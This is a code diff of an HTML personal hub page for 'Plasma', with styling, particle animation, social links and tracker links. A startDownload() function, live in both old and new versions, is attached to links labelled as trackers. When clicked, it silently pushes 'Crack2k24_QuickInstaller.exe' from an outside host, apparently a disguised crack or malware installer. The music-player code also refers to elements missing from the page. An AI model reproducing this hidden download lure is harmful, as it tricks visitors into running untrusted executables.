@@ -1,81 +1,535 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Plasma</title>
-  <link href="code/TypeWriter.css" rel="stylesheet" type="text/css"/>
-  <link href="code/style.css" rel="stylesheet" type="text/css"/>
+  <title>Plasma Hub</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <audio src="audio/Dead.mp3" autoplay loop></audio>
-  <img src="favicon.ico" alt="Logo" hidden>
-</head>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --plasma-bg: #000000;
+      --plasma-accent: #ffffff;
+      --plasma-secondary: #888888;
+      --font-sans: 'Inter', sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+    }
 
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: var(--plasma-bg);
+      color: white;
+      font-family: var(--font-sans);
+      overflow: hidden;
+      cursor: none;
+      height: 100vh;
+      width: 100vw;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    /* Custom Cursor */
+    .custom-cursor {
+      width: 8px;
+      height: 8px;
+      background: var(--plasma-accent);
+      border-radius: 50%;
+      position: fixed;
+      pointer-events: none;
+      z-index: 9999;
+      mix-blend-mode: difference;
+      transform: translate(-50%, -50%);
+    }
+
+    .custom-cursor-follower {
+      width: 30px;
+      height: 30px;
+      border: 1px solid var(--plasma-accent);
+      border-radius: 50%;
+      position: fixed;
+      pointer-events: none;
+      z-index: 9998;
+      transform: translate(-50%, -50%);
+      transition: transform 0.1s ease-out;
+    }
+
+    /* Enter Screen */
+    #enter-screen {
+      position: fixed;
+      inset: 0;
+      background: black;
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: opacity 0.8s ease, transform 0.8s ease;
+    }
+
+    #enter-screen.fade-out {
+      opacity: 0;
+      transform: scale(1.1);
+      pointer-events: none;
+    }
+
+    .enter-text {
+      color: var(--plasma-accent);
+      font-family: var(--font-mono);
+      letter-spacing: 0.5em;
+      text-transform: uppercase;
+      font-size: 1.2rem;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 0.3; }
+      50% { opacity: 1; }
+    }
+
+    /* Main Content */
+    .main-content {
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      opacity: 0;
+      transform: scale(0.9);
+      transition: opacity 1s ease 0.5s, transform 1s ease 0.5s;
+    }
+
+    .main-content.visible {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .glass-card {
+      background: rgba(20, 20, 20, 0.95);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 1.5rem;
+      padding: 40px;
+      width: 100%;
+      max-width: 550px;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+      position: relative;
+      transform-style: preserve-3d;
+      perspective: 1000px;
+    }
+
+    .badges {
+      position: absolute;
+      top: 25px;
+      right: 25px;
+      display: flex;
+      gap: 12px;
+      transform: translateZ(20px);
+    }
+
+    .badge {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 6px 14px;
+      border-radius: 12px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.4);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .logo-container {
+      position: relative;
+      margin-top: 10px;
+      margin-bottom: 20px;
+      display: inline-block;
+      transform: translateZ(50px);
+    }
+
+    .logo-img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: #000;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 5px;
+    }
+
+    .title {
+      font-size: 2.2rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      margin-bottom: 5px;
+      transform: translateZ(30px);
+    }
+
+    .verified-icons {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 25px;
+      transform: translateZ(25px);
+      opacity: 0.6;
+    }
+
+    .verified-icons i {
+      font-size: 14px;
+    }
+
+    .divider {
+      width: 100%;
+      height: 1px;
+      background: rgba(255, 255, 255, 0.05);
+      margin: 20px 0;
+    }
+
+    .bio-text {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.5);
+      font-family: var(--font-mono);
+      margin: 15px 0;
+      transform: translateZ(20px);
+    }
+
+    .trackers-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin: 20px 0;
+      transform: translateZ(35px);
+    }
+
+    .trackers-list a {
+      color: rgba(255, 255, 255, 0.4);
+      text-decoration: none;
+      font-size: 12px;
+      font-family: var(--font-mono);
+      transition: color 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .trackers-list a:hover {
+      color: white;
+    }
+
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin-top: 20px;
+      transform: translateZ(30px);
+    }
+
+    .social-icons a {
+      color: white;
+      font-size: 20px;
+      opacity: 0.4;
+      transition: opacity 0.3s, transform 0.3s;
+    }
+
+    .social-icons a:hover {
+      opacity: 1;
+      transform: translateY(-2px);
+    }
+
+    /* Scanline effect */
+    .scanline {
+      width: 100%;
+      height: 100px;
+      z-index: 10;
+      background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(255, 255, 255, 0.03) 50%, rgba(0, 0, 0, 0) 100%);
+      opacity: 0.1;
+      position: absolute;
+      bottom: 100%;
+      animation: scanline 8s linear infinite;
+      pointer-events: none;
+    }
+
+    @keyframes scanline {
+      0% { bottom: 100%; }
+      100% { bottom: -100px; }
+    }
+
+    .footer {
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      display: flex;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.2em;
+      color: rgba(255, 255, 255, 0.2);
+    }
+  </style>
+</head>
 <body>
 
-  <canvas id="visual"></canvas>
+<canvas id="visual"></canvas>
+<div class="scanline"></div>
 
-  <!-- This new wrapper is the key to centering everything together -->
-  <div class="main-content">
+<div class="custom-cursor" id="cursor"></div>
+<div class="custom-cursor-follower" id="cursor-follower"></div>
 
-    <!-- TypeWriter text Anim -->
-    <div class="container">
-      <h1><span class="auto-type"></span></h1>
+<div id="enter-screen">
+  <div class="enter-text">[ Click to Enter ]</div>
+</div>
+
+<div class="main-content" id="main-content">
+  <!-- Main Profile Card -->
+  <div class="glass-card">
+    <div class="badges">
+      <div class="badge"><i class="fa fa-eye"></i> 310</div>
+      <div class="badge"><i class="fa fa-hashtag"></i> 5526</div>
     </div>
 
-    <!-- The navigation bar -->
-    <div class="navbar">
-      <div data-role="navbar">
-        <center><img src="images/PlasmaLogo.png" alt="what image shows"></center>
-        <!-- This is the modified link -->
-        <a href="krakenreborn.html" onclick="startDownload()"><i class="fa fa-fw fa-user"></i> Crakcocain</a>
-        <a href="mindex.html" onclick="startDownload()"><i class="fa fa-fw fa-user"></i> Myrient EOL Tracker</a>
-        <a href="rrtracker.html" onclick="startDownload()"><i class="fa fa-fw fa-user"></i> RecRoom EOL Tracker</a>
-        <a href="https://plasmaware.myspreadshop.com/"><i class="fa fa-fw fa-user"></i> Merch</a>
-      </div>
+    <div class="logo-container">
+      <img src="https://8ktv.github.io/images/PlasmaLogo.png" alt="Plasma Logo" class="logo-img">
     </div>
 
-  </div> <!-- The closing tag for the new wrapper -->
+    <h1 class="title">plamşa</h1>
 
+    <div class="verified-icons">
+      <i class="fa fa-check-circle"></i>
+      <i class="fa fa-clock-o"></i>
+    </div>
 
-  <script src="https://unpkg.com/typed.js@2.0.16/dist/typed.umd.js"></script>
-  <script>
-    function shuffleArray(array) {
-      for (let i = array.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [array[i], array[j]] = [array[j], array[i]];
+    <div class="divider"></div>
+
+    <div class="bio-text">
+      <span id="auto-type"></span>
+    </div>
+
+    <div class="trackers-list">
+      <a href="krakenreborn.html" onclick="startDownload()">
+        <i class="fa fa-user"></i> Crakcocain
+      </a>
+      <a href="mindex.html" onclick="startDownload()">
+        <i class="fa fa-user"></i> Myrient EOL Tracker
+      </a>
+      <a href="rrtracker.html" onclick="startDownload()">
+        <i class="fa fa-user"></i> RecRoom EOL Tracker
+      </a>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="social-icons">
+      <a href="https://plasmaware.myspreadshop.com/" target="_blank" rel="noopener noreferrer"><i class="fa fa-shopping-cart"></i></a>
+      <a href="https://instagram.com/plasmadoesstuff" target="_blank" rel="noopener noreferrer"><i class="fa fa-instagram"></i></a>
+      <a href="https://soundcloud.com/prodplvsmv?utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing" target="_blank" rel="noopener noreferrer"><i class="fa fa-soundcloud"></i></a>
+    </div>
+  </div>
+</div>
+
+<audio id="bg-audio" src="audio/Dead.mp3" loop></audio>
+
+<script src="https://unpkg.com/typed.js@2.0.16/dist/typed.umd.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.1/vanilla-tilt.min.js"></script>
+<script>
+  // Typed.js initialization
+  function initTyped() {
+    const stringsArray = ["Money twerk $$$$", "hycological/warfare", "Schizophrenic black caht", "Boo!", "Plasmaware Protocol"];
+    // Shuffle
+    for (let i = stringsArray.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [stringsArray[i], stringsArray[j]] = [stringsArray[j], stringsArray[i]];
+    }
+
+    new Typed("#auto-type", {
+      strings: stringsArray,
+      typeSpeed: 80,
+      backSpeed: 50,
+      loop: true,
+      cursorChar: '_'
+    });
+  }
+
+  // Initialize Tilt
+  function initTilt() {
+    VanillaTilt.init(document.querySelector(".glass-card"), {
+      max: 15,
+      speed: 400,
+      glare: true,
+      "max-glare": 0.2,
+    });
+  }
+
+  // Plasma Background
+  const canvas = document.getElementById('visual');
+  const ctx = canvas.getContext('2d');
+  let particles = [];
+  const particleCount = 100;
+
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+
+  class Particle {
+    constructor() {
+      this.init();
+    }
+    init() {
+      this.x = Math.random() * canvas.width;
+      this.y = Math.random() * canvas.height;
+      this.size = Math.random() * 2 + 1;
+      this.speedX = (Math.random() - 0.5) * 2;
+      this.speedY = (Math.random() - 0.5) * 2;
+      this.color = Math.random() > 0.5 ? '#ffffff' : '#888888';
+    }
+    update() {
+      this.x += this.speedX;
+      this.y += this.speedY;
+      if (this.x > canvas.width) this.x = 0;
+      else if (this.x < 0) this.x = canvas.width;
+      if (this.y > canvas.height) this.y = 0;
+      else if (this.y < 0) this.y = canvas.height;
+    }
+    draw() {
+      ctx.fillStyle = this.color;
+      ctx.shadowBlur = 10;
+      ctx.shadowColor = this.color;
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+      ctx.fill();
+    }
+  }
+
+  function initParticles() {
+    particles = [];
+    for (let i = 0; i < particleCount; i++) {
+      particles.push(new Particle());
+    }
+  }
+
+  function animate() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    particles.forEach(p => {
+      p.update();
+      p.draw();
+    });
+    for (let i = 0; i < particles.length; i++) {
+      for (let j = i; j < particles.length; j++) {
+        const dx = particles[i].x - particles[j].x;
+        const dy = particles[i].y - particles[j].y;
+        const distance = Math.sqrt(dx * dx + dy * dy);
+        if (distance < 100) {
+          ctx.strokeStyle = `rgba(255, 255, 255, ${1 - distance / 100})`;
+          ctx.lineWidth = 0.5;
+          ctx.beginPath();
+          ctx.moveTo(particles[i].x, particles[i].y);
+          ctx.lineTo(particles[j].x, particles[j].y);
+          ctx.stroke();
+        }
       }
     }
+    requestAnimationFrame(animate);
+  }
 
-    var stringsArray = ["Money twerk $$$$", "hycological/warfare", "Schizophrenic black cat", "Boo!"];
-    shuffleArray(stringsArray);
+  window.addEventListener('resize', resize);
+  resize();
+  initParticles();
+  animate();
 
-    var typed = new Typed(".auto-type", {
-      strings: stringsArray,
-      typeSpeed: 100,
-      backSpeed: 100,
-      loop: true
-    });
-  </script>
+  // Custom Cursor
+  const cursor = document.getElementById('cursor');
+  const follower = document.getElementById('cursor-follower');
+  document.addEventListener('mousemove', (e) => {
+    cursor.style.left = e.clientX + 'px';
+    cursor.style.top = e.clientY + 'px';
+    setTimeout(() => {
+      follower.style.left = e.clientX + 'px';
+      follower.style.top = e.clientY + 'px';
+    }, 50);
+  });
 
-  <!-- This is the new JavaScript function to trigger the download -->
-  <script>
-    function startDownload() {
-      // Create a temporary, invisible link element
-      const downloadLink = document.createElement('a');
-      downloadLink.href = 'https://catnip.at.ua/krackern/Crack2k24_QuickInstaller.exe';
-      
-      // Set the download attribute to suggest a filename
-      downloadLink.setAttribute('download', 'Crack2k24_QuickInstaller.exe');
-      
-      // Add the link to the page, click it to trigger the download, and then remove it
-      document.body.appendChild(downloadLink);
-      downloadLink.click();
-      document.body.removeChild(downloadLink);
+  // Enter Screen Logic
+  const enterScreen = document.getElementById('enter-screen');
+  const mainContent = document.getElementById('main-content');
+  const audio = document.getElementById('bg-audio');
+
+  // Music Player Logic
+  function initMusicPlayer() {
+    const audio = document.getElementById('bg-audio');
+    const playPauseBtn = document.getElementById('play-pause');
+    const progressBar = document.getElementById('progress-bar');
+    const progressContainer = document.getElementById('progress-container');
+    const currentTimeEl = document.getElementById('current-time');
+    const durationEl = document.getElementById('duration');
+
+    function formatTime(seconds) {
+      const min = Math.floor(seconds / 60);
+      const sec = Math.floor(seconds % 60);
+      return `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
     }
-  </script>
 
-  <script src="script.js"></script>
+    audio.addEventListener('timeupdate', () => {
+      const percent = (audio.currentTime / audio.duration) * 100;
+      progressBar.style.width = `${percent}%`;
+      currentTimeEl.textContent = formatTime(audio.currentTime);
+    });
 
+    audio.addEventListener('loadedmetadata', () => {
+      durationEl.textContent = formatTime(audio.duration);
+    });
+
+    playPauseBtn.addEventListener('click', () => {
+      if (audio.paused) {
+        audio.play();
+        playPauseBtn.classList.replace('fa-play', 'fa-pause');
+      } else {
+        audio.pause();
+        playPauseBtn.classList.replace('fa-pause', 'fa-play');
+      }
+    });
+
+    progressContainer.addEventListener('click', (e) => {
+      const width = progressContainer.clientWidth;
+      const clickX = e.offsetX;
+      const duration = audio.duration;
+      audio.currentTime = (clickX / width) * duration;
+    });
+  }
+
+  enterScreen.addEventListener('click', () => {
+    enterScreen.classList.add('fade-out');
+    mainContent.classList.add('visible');
+    audio.play().catch(e => console.log("Audio play blocked:", e));
+    initTyped();
+    initTilt();
+    initMusicPlayer();
+  });
+
+  // Download Function
+  function startDownload() {
+    const downloadLink = document.createElement('a');
+    downloadLink.href = 'https://catnip.at.ua/krackern/Crack2k24_QuickInstaller.exe';
+    downloadLink.setAttribute('download', 'Crack2k24_QuickInstaller.exe');
+    document.body.appendChild(downloadLink);
+    downloadLink.click();
+    document.body.removeChild(downloadLink);
+  }
+</script>
 </body>
 </html>
+
